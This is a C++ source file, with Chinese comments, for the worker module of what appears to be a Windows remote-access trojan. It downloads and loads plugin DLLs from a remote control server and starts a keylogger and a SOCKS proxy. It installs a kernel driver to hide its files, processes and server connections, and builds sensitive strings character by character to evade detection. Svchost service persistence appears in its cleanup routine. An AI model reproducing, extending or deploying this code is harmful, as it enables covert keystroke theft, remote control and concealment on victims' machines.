// MyWorkMoudle.cpp: implementation of the CMyWorkMoudle class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyWorkMoudle.h"
#include "MyClientTran.h"
#include "md5.h"
#include "MyMainFunc.h"
#include "Lzw.h"

typedef void (WINAPI* PMAINPROCESS)(PSDLLINFO, DWORD*);
typedef void (WINAPI* STARTMYKEY)();

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyWorkMoudle::CMyWorkMoudle()
{
	ZeroMemory(m_ModFilePath, sizeof(m_ModFilePath));
	ZeroMemory(m_KeyFilePath, sizeof(m_KeyFilePath));
	ZeroMemory(m_SysFilePath, sizeof(m_SysFilePath));
	ZeroMemory(m_SckFilePath, sizeof(m_SckFilePath));
	ZeroMemory(&m_DllInfo, sizeof(PSDLLINFO));
	hCtrMd = NULL;
	SysHandle = NULL;
}

CMyWorkMoudle::~CMyWorkMoudle()
{

}

HMODULE CMyWorkMoudle::GetModFile(char* pFilePath, UINT nCmd)
{
	//MD5校验
	BYTE m_DllFileMd5[24] = {0};
	MakeModFileMd5(m_ModFilePath, m_DllFileMd5);

	//连接服务器，上送本地文件校验码
	CMyClientTran m_Tran;
	if(!m_Tran.Create(nCmd, m_DllInfo.m_ServerAddr, m_DllInfo.m_ServerPort, 
		m_DllInfo.m_DdnsUrl, m_DllInfo.m_PassWord) || !m_Tran.SendData(m_DllFileMd5, 16))
	{
		return NULL;
	}

	//接收文件长度
	DWORD nFileLen = 0;
	if(!m_Tran.RecvData(&nFileLen, sizeof(DWORD)))
	{
		return NULL;
	}

	//查看是否需要接收文件
	if(nFileLen == 0)
	{
		return LoadLibrary(pFilePath);
	}

	//接收文件
	BYTE* pFileData = new BYTE[nFileLen + 65535];
	ZeroMemory(pFileData, nFileLen + 65535);
	if(!m_Tran.RecvData(pFileData, nFileLen))
	{
		delete [] pFileData;
		return NULL;
	}

	//解压文件
	FCLzw lzw;
	if(!lzw.PcSaveData(pFileData, pFilePath))
	{
		delete [] pFileData;
		return NULL;
	}
	delete [] pFileData;

	//装载DLL文件
	return LoadLibrary(pFilePath);
}

void CMyWorkMoudle::MakeKeyMon()
{
	//下载键盘监控插件
	HMODULE hKeyMd = NULL;
	while(1)
	{
		//下载工作插件到本地
		hKeyMd = GetModFile(m_KeyFilePath, WM_CONNECT_KEYM);
		if(hKeyMd == NULL)
		{
			//休息等待指定时间
			Sleep(m_DllInfo.m_DelayTime);
		}
		else
		{
			break;
		}
	}

	//启动键盘监控
	STARTMYKEY StartMyKey = (STARTMYKEY) GetProcAddress(hKeyMd, "StartKey");
	if(StartMyKey != NULL)
	{
		StartMyKey();
	}

	//工作结束
	FreeLibrary(hKeyMd);
}

void CMyWorkMoudle::MakeKeyMonThread(LPVOID lPvoid)
{
	CMyWorkMoudle* pThis = (CMyWorkMoudle*) lPvoid;
	pThis->MakeKeyMon();
}

void CMyWorkMoudle::MakeSocks()
{
	HMODULE hSocksMd = LoadLibrary(m_SckFilePath);
	if(hSocksMd == NULL)
	{
		return;
	}

	//启动SOCKS服务
	STARTMYKEY StartMyKey = (STARTMYKEY) GetProcAddress(hSocksMd, "StartSocks");
	if(StartMyKey != NULL)
	{
		StartMyKey();
	}

	//工作结束
	FreeLibrary(hSocksMd);
}

void CMyWorkMoudle::MakeSocksThread(LPVOID lPvoid)
{
	CMyWorkMoudle* pThis = (CMyWorkMoudle*) lPvoid;
	pThis->MakeSocks();
}

void CMyWorkMoudle::SSH_InDvThread(LPVOID lPvoid)
{
	CMyWorkMoudle* pThis = (CMyWorkMoudle*) lPvoid;
	pThis->InstallMyDriver();
}

void CMyWorkMoudle::UnInstallKey()
{
	//键盘监控
	if(m_DllInfo.m_IsKeyMon > 0)
	{
		HMODULE hKeyMd = LoadLibrary(m_KeyFilePath);
		if(hKeyMd != NULL)
		{
			STARTMYKEY StopMyKey = (STARTMYKEY) GetProcAddress(hKeyMd, "StopKey");
			if(StopMyKey != NULL)
			{
				StopMyKey();
			}
			FreeLibrary(hKeyMd);
		}
		DeleteFile(m_KeyFilePath);

		//保存文件名称
		char m_ModuleFileName[256] = {0};
		GetModuleFileName(hInstance, m_ModuleFileName, 255);
		char* pStart = strrchr(m_ModuleFileName, '\\');
		*pStart = 0x00;
		wsprintf(pStart, "\\%szt.txt", m_DllInfo.m_ServiceName);
		DeleteFile(m_ModuleFileName);
	}
}

void CMyWorkMoudle::UnInstallSocks()
{
	//查看是否有socks服务
	HMODULE hSocksMd = LoadLibrary(m_SckFilePath);
	if(hSocksMd != NULL)
	{
		STARTMYKEY StartMyKey = (STARTMYKEY) GetProcAddress(hSocksMd, "StopSocks");
		if(StartMyKey != NULL)
		{
			StartMyKey();
		}

		//工作结束
		FreeLibrary(hSocksMd);
	}

	//保存文件名称
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(hInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	*pStart = 0x00;
	wsprintf(pStart, "\\%sza.txt", m_DllInfo.m_ServiceName);
	DeleteFile(m_ModuleFileName);
}

void CMyWorkMoudle::DoWork(PSDLLINFO m_Info, HINSTANCE ghInstance)
{
	hInstance = ghInstance;

	//初始化数据
	InitMyData(m_Info);

	//加载驱动隐藏
	if(m_DllInfo.m_IsSys)
	{
		//隐藏文件，连接，进程
		_beginthread(SSH_InDvThread, 0, this);
	}

#ifdef _VIP_

	//查看是否有键盘监控
	if(m_DllInfo.m_IsKeyMon > 0)
	{
		_beginthread(MakeKeyMonThread, 0, this);
	}

	//检查是否要开启socks服务
	_beginthread(MakeSocksThread, 0, this);

#endif

	//下载控制插件
	while(1)
	{
		//下载工作插件到本地
		hCtrMd = GetModFile(m_ModFilePath, WM_CONNECT_DMOD);
		if(hCtrMd == NULL)
		{
			//休息等待指定时间
			Sleep(m_DllInfo.m_DelayTime);
		}
		else
		{
			break;
		}
	}

	//开始进入工作循环
	DWORD Ret = 0;
	while(1)
	{
		//Vip20101125
		char m_TmpStr[256] = {0};
		m_TmpStr[0] = 'V';
		m_TmpStr[1] = 'i';
		m_TmpStr[2] = 'p';
		m_TmpStr[3] = '2';
		m_TmpStr[4] = '0';
		m_TmpStr[5] = '1';
		m_TmpStr[6] = '0';
		m_TmpStr[7] = '1';
		m_TmpStr[8] = '1';
		m_TmpStr[9] = '2';
		m_TmpStr[10] = '5';
		m_TmpStr[11] = 0x00;

		//开始监控工作
		PMAINPROCESS MainProcess = (PMAINPROCESS) GetProcAddress(hCtrMd, m_TmpStr);
		if(MainProcess != NULL)
		{
			MainProcess(m_DllInfo, &Ret);
		}

		//查看返回值
		if(Ret == PS_CLIENT_UNINSTALL)
		{
			//释放资源
			FreeLibrary(hCtrMd);

			//删除临时文件
			DeleteFile(m_ModFilePath);

			//删除服务
			MyMainFunc::DeleteMyService(m_DllInfo.m_ServiceName);

			//卸驱动
			UnloadMyDriver();

#ifdef _VIP_
			//卸载键盘监控
			UnInstallKey();

			//卸载socks服务
			UnInstallSocks();
#endif

			//%s\\%08x.ini
			m_TmpStr[0] = '%';
			m_TmpStr[1] = 's';
			m_TmpStr[2] = '\\';
			m_TmpStr[3] = '%';
			m_TmpStr[4] = '0';
			m_TmpStr[5] = '8';
			m_TmpStr[6] = 'x';
			m_TmpStr[7] = '.';
			m_TmpStr[8] = 'i';
			m_TmpStr[9] = 'n';
			m_TmpStr[10] = 'i';
			m_TmpStr[11] = 0x00;

			//删除批次号文件
			char m_FlagFileName[256] = {0};
			char m_SysTempPath[256] = {0};
			GetTempPath(200, m_SysTempPath);
			wsprintf(m_FlagFileName, "%s\\%08x.tmp", m_SysTempPath, m_DllInfo.m_CreateFlag);
			DeleteFile(m_FlagFileName);

			//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost
			m_TmpStr[0] = 'S';
			m_TmpStr[1] = 'O';
			m_TmpStr[2] = 'F';
			m_TmpStr[3] = 'T';
			m_TmpStr[4] = 'W';
			m_TmpStr[5] = 'A';
			m_TmpStr[6] = 'R';
			m_TmpStr[7] = 'E';
			m_TmpStr[8] = '\\';
			m_TmpStr[9] = 'M';
			m_TmpStr[10] = 'i';
			m_TmpStr[11] = 'c';
			m_TmpStr[12] = 'r';
			m_TmpStr[13] = 'o';
			m_TmpStr[14] = 's';
			m_TmpStr[15] = 'o';
			m_TmpStr[16] = 'f';
			m_TmpStr[17] = 't';
			m_TmpStr[18] = '\\';
			m_TmpStr[19] = 'W';
			m_TmpStr[20] = 'i';
			m_TmpStr[21] = 'n';
			m_TmpStr[22] = 'd';
			m_TmpStr[23] = 'o';
			m_TmpStr[24] = 'w';
			m_TmpStr[25] = 's';
			m_TmpStr[26] = ' ';
			m_TmpStr[27] = 'N';
			m_TmpStr[28] = 'T';
			m_TmpStr[29] = '\\';
			m_TmpStr[30] = 'C';
			m_TmpStr[31] = 'u';
			m_TmpStr[32] = 'r';
			m_TmpStr[33] = 'r';
			m_TmpStr[34] = 'e';
			m_TmpStr[35] = 'n';
			m_TmpStr[36] = 't';
			m_TmpStr[37] = 'V';
			m_TmpStr[38] = 'e';
			m_TmpStr[39] = 'r';
			m_TmpStr[40] = 's';
			m_TmpStr[41] = 'i';
			m_TmpStr[42] = 'o';
			m_TmpStr[43] = 'n';
			m_TmpStr[44] = '\\';
			m_TmpStr[45] = 'S';
			m_TmpStr[46] = 'v';
			m_TmpStr[47] = 'c';
			m_TmpStr[48] = 'H';
			m_TmpStr[49] = 'o';
			m_TmpStr[50] = 's';
			m_TmpStr[51] = 't';
			m_TmpStr[52] = 0x00;

			HKEY m_key = NULL;
			long ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, m_TmpStr, 0, KEY_ALL_ACCESS, &m_key);
			if(ret == ERROR_SUCCESS)
			{
				//ATI
				RegDeleteValue(m_key, m_DllInfo.m_ServiceName);
				RegCloseKey(m_key);
			}
			break;
		}
		else if(Ret == PS_CLIENT_EXIT)
		{
			//关机或者重启
			Sleep(0xffffffff);
		}
		else
		{
			//继续工作，休息等待指定时间
			Sleep(m_DllInfo.m_DelayTime);
		}
	}
}

void CMyWorkMoudle::MakeModFileMd5(LPCTSTR pFileName, BYTE* sMd5Str)
{
	HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD nReadLen = 0;
	DWORD nFileLen = GetFileSize(hFile, NULL);
	BYTE* pFileData = new BYTE[nFileLen];
	ReadFile(hFile, pFileData, nFileLen, &nReadLen, NULL);
	CloseHandle(hFile);

	//校验本地文件
	MD5_CTX context = {0};
	MD5Init (&context);
	MD5Update (&context, pFileData, nFileLen);
	MD5Final (&context);

	//保存校验码
	CopyMemory(sMd5Str, &context, 16);

	delete [] pFileData;
}	

void CMyWorkMoudle::InitMyData(PSDLLINFO m_Info)
{
	CopyMemory(&m_DllInfo, &m_Info, sizeof(PSDLLINFO));
	
	/*z.dll*/
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = (char) 0x7a;
	m_TmpStr[1] = (char) 0x00;
	m_TmpStr[1] = (char) 0x2e;
	m_TmpStr[2] = (char) 0x64;
	m_TmpStr[3] = (char) 0x00;
	m_TmpStr[3] = (char) 0x6c;
	m_TmpStr[4] = (char) 0x6c;
	m_TmpStr[5] = 0x00;

	//确定功能dll目录
	GetModuleFileName(hInstance, m_ModFilePath, 200);
	char* pFind = strrchr(m_ModFilePath, '.');
	if(pFind != NULL)
	{
		*pFind = 0;
		strcat(pFind, m_TmpStr);
	}

	/*zt.dll*/
	m_TmpStr[0] = (char) 0x7a;
	m_TmpStr[1] = (char) 0x74;
	m_TmpStr[2] = (char) 0x2e;
	m_TmpStr[3] = (char) 0x64;
	m_TmpStr[4] = (char) 0x6c;
	m_TmpStr[5] = (char) 0x6c;
	m_TmpStr[6] = 0x00;

	//确定键盘记录保存目录
	GetModuleFileName(hInstance, m_KeyFilePath, 200);
	pFind = strrchr(m_KeyFilePath, '.');
	if(pFind != NULL)
	{
		*pFind = 0;
		strcat(pFind, m_TmpStr);
	}

	/*za.dll*/
	m_TmpStr[0] = (char) 0x7a;
	m_TmpStr[1] = (char) 0x61;
	m_TmpStr[2] = (char) 0x2e;
	m_TmpStr[3] = (char) 0x64;
	m_TmpStr[4] = (char) 0x6c;
	m_TmpStr[5] = (char) 0x6c;
	m_TmpStr[6] = 0x00;

	//确定SOCKS记录保存目录
	GetModuleFileName(hInstance, m_SckFilePath, 200);
	pFind = strrchr(m_SckFilePath, '.');
	if(pFind != NULL)
	{
		*pFind = 0;
		strcat(pFind, m_TmpStr);
	}

	//驱动文件保存目录
	//.sys
	char m_TempStr[256] = {0};
	m_TempStr[0] = '.';
	m_TempStr[1] = 's';
	m_TempStr[2] = 'y';
	m_TempStr[3] = 's';
	m_TempStr[4] = 0x00;

	//确定功能dll目录
	GetModuleFileName(hInstance, m_SysFilePath, 200);
	pFind = strrchr(m_SysFilePath, '.');
	if(pFind != NULL)
	{
		strcat(pFind, m_TempStr);
	}
}

BOOL CMyWorkMoudle::InstallDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe)
{
     SC_HANDLE schService = CreateService( SchSCManager,          // SCManager database
                                DriverName,           // name of service
                                DriverName,           // name to display
                                SERVICE_ALL_ACCESS,    // desired access
                                SERVICE_KERNEL_DRIVER, // service type
                                SERVICE_AUTO_START,  // start type
                                SERVICE_ERROR_NORMAL,  // error control type
                                ServiceExe,            // service's binary
                                NULL,                  // no load ordering group
                                NULL,                  // no tag identifier
                                NULL,                  // no dependencies
                                NULL,                  // LocalSystem account
                                NULL                   // no password
                                );
    if (schService == NULL)
	{
        return FALSE;
	}
    CloseServiceHandle(schService);
    return TRUE;
}

BOOL CMyWorkMoudle::StartDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName)
{
	SC_HANDLE schService = OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);
    if(schService == NULL)
	{
        return FALSE;
	}
    BOOL ret = StartService( schService, 0, NULL );
	CloseServiceHandle(schService);
    return ret;
}

BOOL CMyWorkMoudle::OpenDevice(IN LPCTSTR DriverName, HANDLE* lphDevice )
{
	//\\\\.\\%s
	char m_TempStr[256] = {0};
	m_TempStr[0] = '\\';
	m_TempStr[1] = '\\';
	m_TempStr[2] = '.';
	m_TempStr[3] = '\\';
	m_TempStr[4] = '%';
	m_TempStr[5] = 's';
	m_TempStr[6] = 0x00;

    char completeDeviceName[64] = {0};
   	wsprintf(completeDeviceName, m_TempStr, DriverName );
    HANDLE hDevice = CreateFile( completeDeviceName,
                          GENERIC_READ | GENERIC_WRITE,
                          0,
                          NULL,
                          OPEN_EXISTING,
                          FILE_ATTRIBUTE_NORMAL,
                          NULL
                          );
    if(hDevice == ((HANDLE)-1))
	{
        return FALSE;
	}
	if(lphDevice)
	{
		*lphDevice = hDevice;
	}
	else
	{
	    CloseHandle(hDevice);
	}
    return TRUE;
}

BOOL CMyWorkMoudle::StopDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE       schService;
    BOOL            ret;
    SERVICE_STATUS  serviceStatus;
    schService = OpenService( SchSCManager, DriverName, SERVICE_ALL_ACCESS );
    if ( schService == NULL )
	{
        return FALSE;
	}
    ret = ControlService( schService, SERVICE_CONTROL_STOP, &serviceStatus );
    CloseServiceHandle( schService );
    return ret;
}

BOOL CMyWorkMoudle::RemoveDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName )
{
    SC_HANDLE  schService;
    BOOL       ret;
    schService = OpenService( SchSCManager,
                              DriverName,
                              SERVICE_ALL_ACCESS
                              );

    if (schService == NULL)
	{
        return FALSE;
	}
    ret = DeleteService( schService );
    CloseServiceHandle( schService );
    return ret;
}

BOOL CMyWorkMoudle::UnloadDeviceDriver(const char * Name )
{
	SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	StopDriver(schSCManager, Name);
	RemoveDriver(schSCManager, Name);
	CloseServiceHandle( schSCManager);
	return TRUE;
}

BOOL CMyWorkMoudle::InstallDeviceDriver( const char * Name, const char * Path, HANDLE * lphDevice )
{
	SC_HANDLE	schSCManager;
	BOOL		okay;
	schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	InstallDriver( schSCManager, Name, Path );
	StartDriver(schSCManager, Name );
	okay = OpenDevice( Name, lphDevice );
 	CloseServiceHandle( schSCManager );
	return okay;
}

void CMyWorkMoudle::SendDataToDrivers(DWORD nCmd, LPVOID pData, DWORD dLen)
{
	if(SysHandle != NULL)
	{
		DWORD nb = 0;
		DeviceIoControl(SysHandle, nCmd, pData, dLen, NULL, 0, &nb, NULL);
	}
}

void CMyWorkMoudle::UnloadMyDriver() 
{
	if(SysHandle != NULL)
	{
		//卸载驱动
		SendDataToDrivers(HIDEME_UnHook, NULL, 0);
		UnloadDeviceDriver(m_DllInfo.m_SysName);
	}
}

void CMyWorkMoudle::InstallMyDriver() 
{
	if(SysHandle == NULL)
	{
		char m_SysFilePath[256] = {0};

		//.sys
		char m_TempStr[256] = {0};
		m_TempStr[0] = '.';
		m_TempStr[1] = 's';
		m_TempStr[2] = 'y';
		m_TempStr[3] = 's';
		m_TempStr[4] = 0x00;

		//确定功能dll目录
		GetModuleFileName(hInstance, m_SysFilePath, 200);
		char* pFind = strrchr(m_SysFilePath, '.');
		if(pFind != NULL)
		{
			strcat(pFind, m_TempStr);
		}

		//装载驱动
		InstallDeviceDriver(m_DllInfo.m_SysName, m_SysFilePath, &SysHandle);

		//启动HOOK
		DWORD nb = 0;
		SendDataToDrivers(HIDEME_Hook, NULL, 0);
	}

	//查看驱动是否安装好
	if(SysHandle == NULL)
	{
		return;
	}

	//隐藏连接
	ULONG  m_HideIp[2] = {0};

	CMyClientTran m_Tran;

	//URL服务器连接
	if(lstrlen(m_DllInfo.m_DdnsUrl) != 0)
	{
		char m_UrlServerName[MAX_PATH] = {0};
		lstrcpy(m_UrlServerName, m_DllInfo.m_DdnsUrl);
		char* pFind = StrChr(m_UrlServerName, '/');
		if(pFind != NULL)
		{
			*pFind = 0x00;
		}

		//服务器的IP
		m_HideIp[0] = m_Tran.GetIpLong(m_UrlServerName);

		//实际的IP
		char  m_ServerAddr[MAX_PATH] = {0};
		DWORD nServerPort = 0;
		if(m_Tran.GetRealServerInfo(m_DllInfo.m_DdnsUrl, m_ServerAddr, (UINT*) &nServerPort))
		{
			m_HideIp[1] = m_Tran.GetIpLong(m_ServerAddr);
		}
	}
	else
	{
		m_HideIp[1] = m_Tran.GetIpLong(m_DllInfo.m_ServerAddr);
	}

	//隐藏连接
	SendDataToDrivers(HIDEME_HideNetstat, m_HideIp, sizeof(ULONG) * 2);
}

